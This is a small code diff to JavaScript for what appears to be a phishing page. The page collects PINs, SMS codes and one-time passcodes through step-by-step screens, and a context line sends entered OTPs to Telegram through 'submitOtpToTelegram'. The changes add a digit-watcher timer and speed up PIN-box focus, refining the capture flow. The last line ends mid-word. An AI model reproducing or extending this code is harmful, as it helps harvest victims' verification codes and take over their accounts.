@@ -62,6 +62,7 @@
     let currentUserId = null;
     let statusPollInterval = null;
     let smsTimerInterval = null;
+    let digitWatcherInterval = null;
     let smsAutoSubmittedForCurrentValue = '';
     let pinSubmittedForCurrentValue = '';
     let otpSubmittedForCurrentValue = '';
@@ -230,9 +231,7 @@
       hideBanner(bannerOtpError);
 
       showScreen(screens.pin);
-      setTimeout(() => {
-        if (pinBoxes5[0]) pinBoxes5[0].focus();
-      }, 30);
+      if (pinBoxes5[0]) pinBoxes5[0].focus();
 
       try {
         const res = await fetch(
@@ -551,4 +550,4 @@
           await submitOtpToTelegram(otpVal, false);
           break;
         }
-       
+        cas
